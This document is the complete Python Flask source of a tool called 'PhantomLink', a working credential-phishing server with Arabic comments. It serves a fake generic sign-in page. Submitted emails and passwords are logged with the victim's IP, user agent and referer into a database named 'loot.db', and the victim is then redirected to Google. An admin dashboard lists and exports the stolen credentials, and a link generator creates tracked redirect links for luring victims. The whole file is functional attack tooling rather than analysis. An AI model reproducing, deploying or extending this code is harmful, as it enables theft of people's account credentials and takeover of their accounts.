"""
PhantomLink on Render — Flask web service.
credentials تُخزن في SQLite على Disk.
dashboard محمي بـ ADMIN_KEY.
Null's. archived.
"""

import os
import sqlite3
import secrets
import json
from datetime import datetime, timezone
from flask import (
    Flask, request, redirect, render_template,
    abort, jsonify, session, url_for
)

app = Flask(__name__)
app.secret_key = os.environ.get("SECRET_KEY", secrets.token_hex(32))

# ---------- config ----------

DB_PATH = os.environ.get("DB_PATH", "/var/data/loot.db")
ADMIN_KEY = os.environ.get("ADMIN_KEY", "changeme")
REDIRECT_AFTER = os.environ.get("REDIRECT_AFTER", "https://www.google.com")
BRAND = os.environ.get("BRAND", "Sign in to continue")

# تأكد إن مجلد الـ data موجود (لو ما في disk مثبت، بيرجع للـ cwd)
os.makedirs(os.path.dirname(DB_PATH) or ".", exist_ok=True)

# ---------- db ----------

def db():
    conn = sqlite3.connect(DB_PATH)
    conn.row_factory = sqlite3.Row
    return conn

def init_db():
    with db() as c:
        c.execute("""
            CREATE TABLE IF NOT EXISTS creds (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                ts TEXT NOT NULL,
                ip TEXT,
                ua TEXT,
                referer TEXT,
                email TEXT,
                password TEXT,
                extra TEXT
            )
        """)
        c.execute("""
            CREATE TABLE IF NOT EXISTS hops (
                slug TEXT PRIMARY KEY,
                target TEXT NOT NULL,
                hits INTEGER DEFAULT 0,
                created TEXT NOT NULL
            )
        """)

init_db()

def now():
    return datetime.now(timezone.utc).isoformat()

def new_hop(target: str) -> str:
    slug = secrets.token_urlsafe(8)
    with db() as c:
        c.execute("INSERT INTO hops (slug, target, created) VALUES (?,?,?)",
                  (slug, target, now()))
    return slug

# ---------- routes ----------

@app.route("/")
def index():
    return render_template("login.html", brand=BRAND)

@app.route("/submit", methods=["POST"])
def submit():
    email = request.form.get("email", "")
    password = request.form.get("password", "")
    ip = request.headers.get("X-Forwarded-For", request.remote_addr)
    ua = request.headers.get("User-Agent", "")
    ref = request.headers.get("Referer", "")

    with db() as c:
        c.execute("""INSERT INTO creds
            (ts, ip, ua, referer, email, password, extra)
            VALUES (?,?,?,?,?,?,?)""",
            (now(), ip, ua, ref, email, password,
             json.dumps({"form": request.form.to_dict()})))

    return redirect(REDIRECT_AFTER, code=302)

@app.route("/r/<slug>")
def hop(slug):
    with db() as c:
        row = c.execute("SELECT target FROM hops WHERE slug=?", (slug,)).fetchone()
        if not row:
            abort(404)
        c.execute("UPDATE hops SET hits = hits + 1 WHERE slug=?", (slug,))
    return redirect(row["target"], code=302)

# ---------- admin ----------

@app.route("/admin")
def admin():
    key = request.args.get("key") or session.get("admin_key")
    if key != ADMIN_KEY:
        abort(403)
    session["admin_key"] = key
    with db() as c:
        creds = c.execute("SELECT * FROM creds ORDER BY id DESC LIMIT 500").fetchall()
        hops = c.execute("SELECT * FROM hops ORDER BY created DESC").fetchall()
    return render_template("dashboard.html",
        creds=creds, hops=hops,
        admin_key=key,
        redirect_after=REDIRECT_AFTER)

@app.route("/admin/genhop", methods=["POST"])
def admin_genhop():
    key = request.form.get("key") or session.get("admin_key")
    if key != ADMIN_KEY:
        abort(403)
    target = request.form.get("target") or REDIRECT_AFTER
    new_hop(target)
    return redirect(url_for("admin", key=key))

@app.route("/admin/export")
def admin_export():
    key = request.args.get("key") or session.get("admin_key")
    if key != ADMIN_KEY:
        abort(403)
    with db() as c:
        rows = [dict(r) for r in c.execute("SELECT * FROM creds ORDER BY id DESC").fetchall()]
    return jsonify(rows)

@app.route("/healthz")
def healthz():
    return "ok"

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 8080))
    app.run(host="0.0.0.0", port=port, debug=False)